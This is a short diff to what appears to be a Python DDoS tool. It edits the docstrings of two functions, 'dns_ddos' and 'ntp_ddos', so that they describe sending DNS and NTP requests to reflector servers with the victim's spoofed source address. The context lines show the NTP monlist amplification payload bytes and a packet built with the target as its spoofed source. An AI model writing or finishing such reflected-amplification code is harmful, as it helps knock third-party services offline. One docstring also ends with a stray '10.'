@@ -16,8 +16,9 @@ import time
 
 def dns_ddos(target, dns_server):
     """
-    List of domain names to send DNS requests for
+    Send a DNS request to the DNS server with the spoofed IP address of the target to perform a reflected DDoS.
     """
+    # List of domain names
     dns_hosts = [
         "example.com", "www.example.com", "example.org", "example.be",
         "example.fr", "test.com", "a-very-long-domain-name.com",
@@ -39,7 +40,7 @@ def dns_ddos(target, dns_server):
 
 def ntp_ddos(target, ntp_server):
     """
-    Magic Packet aka NTP v2 Monlist Packet TODO wtf ?
+    Send a NTP request to the NTP server with the spoofed IP address of the target to perform a reflected DDoS. 10.
     """
     data = "\x17\x00\x03\x2a" + "\x00" * 4
     packet = IP(dst=ntp_server, src=target) / \
